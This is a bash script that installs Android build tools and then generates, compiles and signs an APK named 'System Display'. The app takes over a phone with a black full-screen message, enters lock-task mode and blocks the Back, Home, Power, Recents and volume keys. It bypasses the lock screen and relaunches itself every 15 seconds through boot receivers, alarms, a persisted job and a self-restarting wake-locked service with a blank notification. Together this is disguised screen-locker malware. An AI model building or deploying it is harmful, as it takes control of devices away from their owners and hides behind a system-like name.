#!/bin/bash
set -e

# ============================================================
#  build-blackscreen.sh
#  App: Fixed portrait black screen + single sentence + UI lock
# ============================================================
#  Features:
#    * PORTRAIT locked (does not rotate).
#    * KIOSK MODE (Lock Task Mode) — blocks Home / Recents.
#    * Fullscreen immersive — hides Status Bar + Navigation Bar.
#    * KEEP_SCREEN_ON — screen never sleeps.
#    * SHOW_WHEN_LOCKED — appears above lock screen.
#    * Disables Volume + Back + Recents + Home + Power inside app.
#    * AUTO-START on:
#        - BOOT_COMPLETED
#        - LOCKED_BOOT_COMPLETED
#        - QUICKBOOT_POWERON
#        - MY_PACKAGE_REPLACED / PACKAGE_REPLACED / PACKAGE_ADDED
#        - SCREEN_ON / USER_PRESENT
#        - AlarmManager (15s re-arm)
#        - JobScheduler (15min persisted job)
#        - Foreground Service watchdog (15s)
#    * NO DANGEROUS PERMISSIONS:
#        - No Device Admin
#        - No Accessibility
#        - No root
#        - No SYSTEM_ALERT_WINDOW
# ============================================================

GREEN='\033[0;32m'; RED='\033[0;31m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'
log()  { echo -e "${GREEN}[+]${NC} $1"; }
err()  { echo -e "${RED}[x]${NC} $1"; exit 1; }
act()  { echo -e "${CYAN}[→]${NC} $1"; }
skip() { echo -e "${CYAN}[=]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }

# ============================================================
#  CONFIG — change only here
# ============================================================
DISPLAY_TEXT="Display"
APP_LABEL="System Display"
APP_PACKAGE="com.system.display"
APK_OUTPUT="$HOME/SystemDisplay.apk"

# ============================================================
#  Smart Tool Discovery / Setup
# ============================================================
SDK="/usr/lib/android-sdk"
USER_CACHE="${XDG_CACHE_HOME:-$HOME/.cache}/android-sdk"
mkdir -p "$USER_CACHE"

R8_DIR="$SDK/tools"
R8_JAR="$R8_DIR/r8.jar"
D8_BIN="$R8_DIR/d8"

export ANDROID_HOME="$SDK"
export ANDROID_SDK_ROOT="$SDK"

# ---- 1) Detect base CLI tools ------------------------------
need_pkg=""
for b in wget unzip zip java keytool; do
    if command -v "$b" >/dev/null 2>&1; then
        skip "$b: $(command -v "$b")"
    else
        need_pkg="$need_pkg $b"
    fi
done

if [ -n "$need_pkg" ]; then
    act "Installing missing CLI tools:$need_pkg"
    if command -v apt-get >/dev/null 2>&1; then
        sudo apt-get update -qq
        sudo apt-get install -y -qq wget unzip zip default-jdk-headless
    elif command -v dnf >/dev/null 2>&1; then
        sudo dnf install -y -q wget unzip zip java-17-openjdk-headless
    elif command -v yum >/dev/null 2>&1; then
        sudo yum install -y -q wget unzip zip java-17-openjdk-headless
    elif command -v apk >/dev/null 2>&1; then
        sudo apk add --no-cache wget unzip zip openjdk17
    else
        err "Cannot auto-install. Please install manually: wget unzip zip jdk17"
    fi
fi

# ---- 2) Verify JDK version (>= 17) -------------------------
JAVA_VER=$(java -version 2>&1 | awk -F '"' '/version/ {print $2}' | cut -d. -f1)
[ "${JAVA_VER:-0}" -ge 17 ] || err "JDK 17+ required (found: ${JAVA_VER:-none})"
log "Java OK (v$JAVA_VER at $(command -v java))"

# ---- 3) Prepare fixed SDK directory -----------------------
if [ ! -d "$SDK" ] || [ ! -w "$SDK" ]; then
    act "Preparing $SDK (sudo required)"
    sudo mkdir -p "$SDK"
    sudo chown -R "$(id -u):$(id -g)" "$SDK"
fi

# ---- helper: find tool inside SDK, then on system PATH ----
find_tool() {
    local name="$1"
    local cand
    for cand in "$SDK"/build-tools/*/"$name" \
                "$SDK"/cmdline-tools/*/bin/"$name" \
                "$SDK"/platform-tools/"$name"; do
        [ -x "$cand" ] && { echo "$cand"; return 0; }
    done
    if command -v "$name" >/dev/null 2>&1; then
        command -v "$name"; return 0
    fi
    return 1
}

# ---- 4) Ensure cmdline-tools (sdkmanager) ------------------
SDKMANAGER=""
if SDKMANAGER=$(find_tool sdkmanager); then
    skip "sdkmanager: $SDKMANAGER"
else
    act "sdkmanager not found — downloading Android command-line tools..."
    CLT_ZIP="$USER_CACHE/commandlinetools.zip"
    EXTRACT_DIR="$USER_CACHE/extract-clt"

    if [ ! -f "$CLT_ZIP" ]; then
        wget -q "https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip" \
            -O "$CLT_ZIP" || err "Failed to download cmdline-tools"
    fi

    rm -rf "$EXTRACT_DIR" && mkdir -p "$EXTRACT_DIR"
    unzip -q "$CLT_ZIP" -d "$EXTRACT_DIR"

    mkdir -p "$SDK/cmdline-tools"
    rm -rf "$SDK/cmdline-tools/latest"
    mv "$EXTRACT_DIR/cmdline-tools" "$SDK/cmdline-tools/latest"

    rm -rf "$EXTRACT_DIR" "$CLT_ZIP"
    SDKMANAGER="$SDK/cmdline-tools/latest/bin/sdkmanager"
fi
export PATH="$(dirname "$SDKMANAGER"):$PATH"

# ---- 5) Detect build-tools & platform (reuse if present) --
BT=""
for cand in "$SDK"/build-tools/34.0.0 "$SDK"/build-tools/*/; do
    cand="${cand%/}"
    if [ -x "$cand/aapt2" ] && [ -x "$cand/zipalign" ] && [ -x "$cand/apksigner" ]; then
        BT="$cand"; break
    fi
done

PLATFORM_JAR=""
for cand in "$SDK"/platforms/android-34/android.jar "$SDK"/platforms/android-*/android.jar; do
    if [ -f "$cand" ]; then PLATFORM_JAR="$cand"; break; fi
done

# ---- 6) Install ONLY what is missing ----------------------
NEED_PKGS=""
[ -z "$BT" ]           && NEED_PKGS="$NEED_PKGS build-tools;34.0.0"
[ -z "$PLATFORM_JAR" ] && NEED_PKGS="$NEED_PKGS platforms;android-34"

if [ -n "$NEED_PKGS" ]; then
    act "Installing missing SDK packages:$NEED_PKGS"
    yes | "$SDKMANAGER" --licenses >/dev/null 2>&1 || true
    "$SDKMANAGER" --install $NEED_PKGS >/dev/null || err "sdkmanager install failed"
    for cand in "$SDK"/build-tools/34.0.0 "$SDK"/build-tools/*/; do
        cand="${cand%/}"
        [ -x "$cand/aapt2" ] && { BT="$cand"; break; }
    done
    for cand in "$SDK"/platforms/android-34/android.jar "$SDK"/platforms/android-*/android.jar; do
        [ -f "$cand" ] && { PLATFORM_JAR="$cand"; break; }
    done
fi

export PATH="$BT:$SDK/platform-tools:$PATH"

[ -x "$BT/aapt2" ]     || err "aapt2 missing (BT=$BT)"
[ -x "$BT/zipalign" ]  || err "zipalign missing (BT=$BT)"
[ -x "$BT/apksigner" ] || err "apksigner missing (BT=$BT)"
[ -f "$PLATFORM_JAR" ] || err "android.jar missing under $SDK"

# ---- 8) R8 / D8 — permanent install inside SDK ------------
D8_JAR=""
for cand in "$R8_JAR" "$SDK/tools/"r8-*.jar "$SDK/build-tools/"*/lib/d8.jar /usr/share/java/r8.jar /usr/share/java/d8.jar; do
    if [ -f "$cand" ]; then D8_JAR="$cand"; break; fi
done

if [ -n "$D8_JAR" ] && [ "$D8_JAR" != "$R8_JAR" ]; then
    mkdir -p "$R8_DIR"
    [ ! -f "$R8_JAR" ] && { cp "$D8_JAR" "$R8_JAR"; chmod 644 "$R8_JAR"; }
    D8_JAR="$R8_JAR"
elif [ -f "$R8_JAR" ]; then
    skip "R8/D8 found: $R8_JAR"
else
    act "R8/D8 not found — installing permanently to $R8_JAR"
    mkdir -p "$R8_DIR"
    TMP_R8="$USER_CACHE/r8-8.3.37.jar"
    wget -q "https://maven.google.com/com/android/tools/r8/8.3.37/r8-8.3.37.jar" -O "$TMP_R8" || err "R8 download failed"
    mv "$TMP_R8" "$R8_JAR"
    chmod 644 "$R8_JAR"
    D8_JAR="$R8_JAR"
fi

if [ ! -x "$D8_BIN" ]; then
    act "Creating d8 wrapper at $D8_BIN"
    mkdir -p "$R8_DIR"
    cat > "$D8_BIN" << WRAPPER
#!/bin/sh
exec java -cp "$R8_JAR" com.android.tools.r8.D8 "\$@"
WRAPPER
    chmod +x "$D8_BIN"
fi

export PATH="$R8_DIR:$PATH"
command -v d8 >/dev/null || err "d8 not on PATH after wrapper install"

log "Toolchain ready. Building now..."

# ============================================================
#  Project
# ============================================================
PROJECT=~/blackscreen-build
rm -rf "$PROJECT"
mkdir -p "$PROJECT"/{src/com/system/display,res/values,res/layout,build/classes,build/dex}
cd "$PROJECT"
PKG_PATH="com/system/display"

# ----- AndroidManifest.xml -----
cat > AndroidManifest.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="$APP_PACKAGE"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="28"/>

    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
    <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>

    <application
        android:label="$APP_LABEL"
        android:allowBackup="false"
        android:directBootAware="true"
        android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:screenOrientation="portrait"
            android:configChanges="orientation|screenSize|keyboardHidden|screenLayout|smallestScreenSize"
            android:excludeFromRecents="true"
            android:launchMode="singleInstance"
            android:taskAffinity=""
            android:showOnLockScreen="true"
            android:turnScreenOn="true"
            android:showWhenLocked="true"
            android:resizeableActivity="false">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <service
            android:name=".KeepAliveService"
            android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="specialUse"/>

        <service
            android:name=".JobKeeperService"
            android:exported="true"
            android:permission="android.permission.BIND_JOB_SERVICE"/>

        <!-- BOOT + quickboot + package replace -->
        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true"
            android:directBootAware="true">
            <intent-filter android:priority="9999">
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
                <action android:name="android.intent.action.REBOOT"/>
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
            </intent-filter>
        </receiver>

        <receiver
            android:name=".RestartReceiver"
            android:enabled="true"
            android:exported="false"/>

        <!-- SCREEN_ON / USER_PRESENT → reopen the app -->
        <receiver
            android:name=".ScreenStateReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.SCREEN_ON"/>
                <action android:name="android.intent.action.SCREEN_OFF"/>
                <action android:name="android.intent.action.USER_PRESENT"/>
            </intent-filter>
        </receiver>

        <receiver
            android:name=".PkgReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
EOF

# ----- Resources -----
cat > res/values/strings.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">$APP_LABEL</string>
    <string name="display_text">$DISPLAY_TEXT</string>
</resources>
EOF

cat > res/layout/activity_main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#000000"
    android:keepScreenOn="true">

    <TextView
        android:id="@+id/text"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="center"
        android:text="@string/display_text"
        android:textColor="#FFFFFF"
        android:textSize="48sp"
        android:textStyle="bold"
        android:gravity="center"
        android:padding="24dp" />
</FrameLayout>
EOF

# ----- MainActivity.java -----
cat > src/$PKG_PATH/MainActivity.java << 'EOF'
package com.system.display;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;

public class MainActivity extends Activity {

    private AudioManager audioManager;
    private int savedMusicVol = -1;
    private int savedRingVol  = -1;
    private int savedAlarmVol = -1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().addFlags(
              WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
            | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
            | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
            | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        );

        setRequestedOrientation(android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);

        applyFullscreen();
        setContentView(R.layout.activity_main);

        try {
            audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (audioManager != null) {
                savedMusicVol = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
                savedRingVol  = audioManager.getStreamVolume(AudioManager.STREAM_RING);
                savedAlarmVol = audioManager.getStreamVolume(AudioManager.STREAM_ALARM);
            }
        } catch (Exception ignored) {}

        startKeepAlive();
        scheduleRestart();
        requestIgnoreBatteryOptimizations();
        startKioskMode();
    }

    private void startKioskMode() {
        try {
            if (Build.VERSION.SDK_INT >= 21) {
                startLockTask();
            }
        } catch (Exception ignored) {}
    }

    private void startKeepAlive() {
        try {
            Intent svc = new Intent(this, KeepAliveService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
            else startService(svc);
        } catch (Exception ignored) {}
    }

    private void requestIgnoreBatteryOptimizations() {
        try {
            if (Build.VERSION.SDK_INT < 23) return;
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) return;
            Intent i = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            i.setData(android.net.Uri.parse("package:" + getPackageName()));
            startActivity(i);
        } catch (Exception ignored) {}
    }

    private void scheduleRestart() {
        try {
            Intent i = new Intent(this, RestartReceiver.class);
            int flags = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= 23) flags |= android.app.PendingIntent.FLAG_IMMUTABLE;
            android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(this, 0, i, flags);
            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(ALARM_SERVICE);
            if (am != null) {
                long trigger = System.currentTimeMillis() + 15000;
                if (Build.VERSION.SDK_INT >= 23) {
                    am.setExactAndAllowWhileIdle(android.app.AlarmManager.RTC_WAKEUP, trigger, pi);
                } else {
                    am.set(android.app.AlarmManager.RTC_WAKEUP, trigger, pi);
                }
            }
        } catch (Exception ignored) {}
    }

    @SuppressWarnings("deprecation")
    private void applyFullscreen() {
        View decor = getWindow().getDecorView();
        if (Build.VERSION.SDK_INT >= 30) {
            getWindow().setDecorFitsSystemWindows(false);
            android.view.WindowInsetsController c = decor.getWindowInsetsController();
            if (c != null) {
                c.hide(android.view.WindowInsets.Type.systemBars());
                c.setSystemBarsBehavior(android.view.WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
            }
        } else {
            decor.setSystemUiVisibility(
                  View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                | View.SYSTEM_UI_FLAG_FULLSCREEN
                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                | View.SYSTEM_UI_FLAG_LOW_PROFILE
            );
        }
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            applyFullscreen();
            restoreVolumes();
            startKioskMode();
            scheduleRestart();
        }
    }

    @Override
    public boolean dispatchKeyEvent(KeyEvent event) {
        int code = event.getKeyCode();
        switch (code) {
            case KeyEvent.KEYCODE_VOLUME_UP:
            case KeyEvent.KEYCODE_VOLUME_DOWN:
            case KeyEvent.KEYCODE_VOLUME_MUTE:
                restoreVolumes();
                return true;
            case KeyEvent.KEYCODE_BACK:
            case KeyEvent.KEYCODE_MENU:
            case KeyEvent.KEYCODE_APP_SWITCH:
            case KeyEvent.KEYCODE_HOME:
            case KeyEvent.KEYCODE_POWER:
                return true; // block all
        }
        return super.dispatchKeyEvent(event);
    }

    private void restoreVolumes() {
        try {
            if (audioManager == null) return;
            if (savedMusicVol >= 0) audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, savedMusicVol, 0);
            if (savedRingVol >= 0) audioManager.setStreamVolume(AudioManager.STREAM_RING, savedRingVol, 0);
            if (savedAlarmVol >= 0) audioManager.setStreamVolume(AudioManager.STREAM_ALARM, savedAlarmVol, 0);
        } catch (Exception ignored) {}
    }

    @Override
    protected void onResume() {
        super.onResume();
        applyFullscreen();
        restoreVolumes();
        scheduleRestart();
        startKeepAlive();
        startKioskMode();
    }

    @Override
    public void onBackPressed() {
        // prevent exit
    }
}
EOF

# ----- KeepAliveService.java -----
cat > src/$PKG_PATH/KeepAliveService.java << 'EOF'
package com.system.display;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;

public class KeepAliveService extends Service {

    private static final String CHANNEL_ID = "ka";
    private static final int NOTIF_ID = 1;
    private static final long INTERVAL = 15000;

    private Handler handler;
    private PowerManager.WakeLock wl;
    private Runnable ticker;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(NOTIF_ID, buildNotification());

        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "sd::wl");
                wl.setReferenceCounted(false);
                wl.acquire();
            }
        } catch (Exception ignored) {}

        handler = new Handler(Looper.getMainLooper());
        ticker = new Runnable() {
            @Override public void run() {
                try {
                    Intent i = new Intent(KeepAliveService.this, MainActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                             | Intent.FLAG_ACTIVITY_SINGLE_TOP
                             | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                             | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
                    startActivity(i);
                } catch (Exception ignored) {}

                scheduleRestartAlarm();
                JobKeeperService.schedule(KeepAliveService.this);
                handler.postDelayed(this, INTERVAL);
            }
        };
        handler.post(ticker);
    }

    private void scheduleRestartAlarm() {
        try {
            Intent i = new Intent(this, RestartReceiver.class);
            int flags = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= 23) flags |= android.app.PendingIntent.FLAG_IMMUTABLE;
            android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(this, 0, i, flags);

            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(ALARM_SERVICE);
            if (am != null) {
                long trigger = System.currentTimeMillis() + INTERVAL;
                if (Build.VERSION.SDK_INT >= 23) {
                    am.setExactAndAllowWhileIdle(android.app.AlarmManager.RTC_WAKEUP, trigger, pi);
                } else {
                    am.set(android.app.AlarmManager.RTC_WAKEUP, trigger, pi);
                }
            }
        } catch (Exception ignored) {}
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= 26) b = new Notification.Builder(this, CHANNEL_ID);
        else b = new Notification.Builder(this);
        return b.setContentTitle("")
                .setSmallIcon(android.R.drawable.presence_online)
                .setOngoing(true)
                .setOnlyAlertOnce(true)
                .setShowWhen(false)
                .setPriority(Notification.PRIORITY_MIN)
                .build();
    }

    @Override
    public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        try { if (wl != null && wl.isHeld()) wl.release(); } catch (Exception ignored) {}
        try {
            Intent svc = new Intent(this, KeepAliveService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
            else startService(svc);
        } catch (Exception ignored) {}
        super.onDestroy();
    }
}
EOF

# ----- BootReceiver.java -----
cat > src/$PKG_PATH/BootReceiver.java << 'EOF'
package com.system.display;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent i) {
        try {
            Intent svc = new Intent(ctx, KeepAliveService.class);
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(svc);
            else ctx.startService(svc);
        } catch (Exception ignored) {}

        try {
            Intent act = new Intent(ctx, MainActivity.class);
            act.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                       | Intent.FLAG_ACTIVITY_CLEAR_TOP
                       | Intent.FLAG_ACTIVITY_SINGLE_TOP
                       | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            ctx.startActivity(act);
        } catch (Exception ignored) {}

        try { JobKeeperService.schedule(ctx); } catch (Exception ignored) {}
        try {
            Intent ri = new Intent(ctx, RestartReceiver.class);
            int flags = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= 23) flags |= android.app.PendingIntent.FLAG_IMMUTABLE;
            android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(ctx, 0, ri, flags);
            android.app.AlarmManager am = (android.app.AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (am != null) {
                long trigger = System.currentTimeMillis() + 15000;
                if (Build.VERSION.SDK_INT >= 23) {
                    am.setExactAndAllowWhileIdle(android.app.AlarmManager.RTC_WAKEUP, trigger, pi);
                } else {
                    am.set(android.app.AlarmManager.RTC_WAKEUP, trigger, pi);
                }
            }
        } catch (Exception ignored) {}
    }
}
EOF

# ----- RestartReceiver.java -----
cat > src/$PKG_PATH/RestartReceiver.java << 'EOF'
package com.system.display;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class RestartReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent i) {
        try {
            Intent svc = new Intent(ctx, KeepAliveService.class);
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(svc);
            else ctx.startService(svc);
        } catch (Exception ignored) {}

        try {
            Intent act = new Intent(ctx, MainActivity.class);
            act.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            ctx.startActivity(act);
        } catch (Exception ignored) {}
    }
}
EOF

# ----- ScreenStateReceiver.java -----
cat > src/$PKG_PATH/ScreenStateReceiver.java << 'EOF'
package com.system.display;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class ScreenStateReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent i) {
        try {
            Intent svc = new Intent(ctx, KeepAliveService.class);
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(svc);
            else ctx.startService(svc);
        } catch (Exception ignored) {}
        try {
            Intent act = new Intent(ctx, MainActivity.class);
            act.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            ctx.startActivity(act);
        } catch (Exception ignored) {}
    }
}
EOF

# ----- PkgReceiver.java -----
cat > src/$PKG_PATH/PkgReceiver.java << 'EOF'
package com.system.display;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class PkgReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent i) {
        try {
            Intent svc = new Intent(ctx, KeepAliveService.class);
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(svc);
            else ctx.startService(svc);
        } catch (Exception ignored) {}
        try {
            Intent act = new Intent(ctx, MainActivity.class);
            act.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            ctx.startActivity(act);
        } catch (Exception ignored) {}
    }
}
EOF

# ----- JobKeeperService.java -----
cat > src/$PKG_PATH/JobKeeperService.java << 'EOF'
package com.system.display;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class JobKeeperService extends JobService {
    private static final int JOB_ID = 0x5D15;

    @Override
    public boolean onStartJob(JobParameters p) {
        try {
            Intent svc = new Intent(this, KeepAliveService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
            else startService(svc);
        } catch (Exception ignored) {}
        try {
            Intent act = new Intent(this, MainActivity.class);
            act.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            startActivity(act);
        } catch (Exception ignored) {}
        return false;
    }

    @Override public boolean onStopJob(JobParameters p) { return true; }

    public static void schedule(Context ctx) {
        try {
            JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return;
            if (js.getPendingJob(JOB_ID) != null) return;
            JobInfo job = new JobInfo.Builder(JOB_ID, new ComponentName(ctx, JobKeeperService.class))
                .setPeriodic(15 * 60 * 1000)
                .setPersisted(true)
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE)
                .build();
            js.schedule(job);
        } catch (Exception ignored) {}
    }
}
EOF

# ============================================================
#  Build
# ============================================================
act "Compiling resources"
aapt2 compile --dir res -o build/res.zip

act "Linking resources"
aapt2 link -o build/base.apk \
    -I "$PLATFORM_JAR" \
    --manifest AndroidManifest.xml \
    --java build/classes \
    --min-sdk-version 21 --target-sdk-version 28 \
    build/res.zip

act "Compiling Java"
javac -source 8 -target 8 \
    -bootclasspath "$PLATFORM_JAR" -classpath "$PLATFORM_JAR" \
    -d build/classes $(find src -name "*.java") \
    build/classes/$PKG_PATH/R.java \
    2>&1 | grep -vE "warning:|Note:" || true

act "Dexing"
d8 --min-api 21 \
    --lib "$PLATFORM_JAR" \
    --output build/dex/ \
    $(find build/classes -name "*.class") 2>&1 | grep -v "^Warning" || true

act "Packaging"
cd build
cp base.apk final.apk
zip -uj final.apk dex/classes.dex > /dev/null
cd ..

act "Signing"
KS=build/key.jks
if [ ! -f "$KS" ]; then
    keytool -genkeypair -keystore "$KS" -alias k -keyalg RSA \
        -keysize 2048 -validity 10000 \
        -storepass android -keypass android \
        -dname "CN=System Display" 2>/dev/null
fi
zipalign -f 4 build/final.apk build/aligned.apk
apksigner sign --ks "$KS" --ks-pass pass:android \
    --key-pass pass:android --out "$APK_OUTPUT" build/aligned.apk

log "APK ready: $APK_OUTPUT"
ls -lh "$APK_OUTPUT"
